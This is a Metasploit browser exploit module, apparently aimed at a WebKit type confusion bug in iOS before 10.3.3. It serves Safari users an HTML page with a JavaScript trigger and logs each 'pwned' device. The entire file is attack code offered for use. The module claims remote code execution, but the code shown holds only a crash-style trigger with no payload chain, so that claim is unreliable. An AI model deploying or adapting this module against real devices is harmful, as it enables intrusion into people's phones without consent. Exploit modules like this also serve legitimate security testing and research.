##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "iOS < 10.3.3 Webkit Type Confusion",
      'Description'    => %q{
        Remote code execution due to type confusion in JSCore befor iOS 10.3.3
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Sem Voigtlander' ],
      'References'     => 
        [
          [ 'URL', 'http://coffeebreakers.space' ]
        ],
      'Platform'       => 'iOS',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
	  [ 'iOS',
	    {
	     'os_name' => OperatingSystems::Match::APPLE_IOS,
             'ua_name' => HttpClients::SAFARI
	    }]
        ],
      'DisclosureDate' => "Sep 21 2017",
      'DefaultTarget'  => 0))
  end
  def exploit_template(target_info)
    template = %Q|
    Data source: <%=target_info[:source]%><br>
    OS name: <%=target_info[:os_name]%><br>
    UA name: <%=target_info[:ua_name]%><br>
    UA version: <%=target_info[:ua_ver]%><br>
    FuKin RoTten ApPleS ?
    <script>
    	let o = {};
	for (let i in {xx: 0}) {
    		for (let j = 0; j < 2; j++) {
        		o[i];
        		i = new Uint32Array([0, 1, 0x777777, 0, 0]);
    		}
	}
    </script>|
      return template, binding()
  end
  def on_request_exploit(cli, req, target_info)
    print_status("Payload request received: #{req.uri}")
    send_exploit_html(cli, exploit_template(target_info))
    print_status("Pwned an: #{target_info[:os_device]} on #{target_info[:os_name]} #{target_info[:ua_ver]}")
  end

end
